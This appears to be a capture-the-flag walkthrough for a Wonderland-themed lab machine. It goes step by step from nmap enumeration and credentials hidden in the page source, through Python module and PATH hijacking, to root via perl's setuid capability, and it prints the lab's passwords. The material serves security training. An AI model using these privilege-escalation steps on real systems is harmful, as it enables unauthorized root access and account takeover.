1. Enumaration:
	
		$$ nmap -sC -sV -oN nmap 10.10.126.5

		==> Nmap 7.92 scan initiated Mon Apr  4 12:07:20
		PORT   STATE SERVICE VERSION

		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
		|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
		|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)

		80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
		|_http-title: Follow the white rabbit.
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	## found a hidden id & password in source of page in location: [view-source:http://10.10.126.5/r/a/b/b/i/t/]

	==> <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

2. Exploitation:

	$$ ssh alice@<IP> //Using that password

3. Privilage escalation(horizontal):

	## As we have the password so do:-

		$$ sudo -l

		==> (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

	## I can run that python script using python3.6 as rabbit user

		$$ cat /home/alice/walrus_and_the_carpenter.py

		==> import random
			...
			for i in range(10):
				...
				print(...)

	## As we can see it is importing the random module.

	## every time a python programm runs it checks all the modules in current directory before finding other location.

	## So we can create a fake random module in current directory.

		$$ nano random.py

		==> import os
			os.system('/bin/bash')

	## Run the script again as the rabbit user

		$$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

	## We are now rabbit user

		$$ cd ../rabbit/


4. Privilage escalation(vertical):

		$$ cat taeParty

		==> The Mad Hatter will be here soon.^@^@^@^@^@/bin/echo -n 'Probably by' && date --date='next hour'

	## Notice that it is running the date command without it's full path.So we can abuse that.

		$$ which date

		==> /bin/date

	## We have no write permission in the '/bin' directory.[$$ touch /bin/a.txt]

		$$ echo $PATH
		$$ export PATH=/home/rabbit:$PATH
		$$ echo $PATH

	## We added our current diarectory in PATH variable

	## creat a fake date in current directory
		
		$$ nano date

		==> /bin/bash

		$$ ./teaParty

	## We are now hatter or we have uid of hatter but we have no gid of hatter.

		$$ id

		==> uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)

		$$ cd ../hatter/

		$$ cat password.txt

		==> WhyIsARavenLikeAWritingDesk?

	## Again login in hatter account with the password.

		$$ su hatter	

		$$ id 

		==> uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)


5. Privilage escalation(vertical)L:

	## Now we have both uid & gid of hatter

		$$ ./linpeas.sh

		==> Files with capabilities (limited to 50):
			/usr/bin/perl5.26.1 = cap_setuid+ep
			/usr/bin/mtr-packet = cap_net_raw+ep

			/usr/bin/perl = cap_setuid+ep

	## perl hash the setuid capabilities.We can abuse that.

	## According to GTFOBins:

		$$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

## We are now root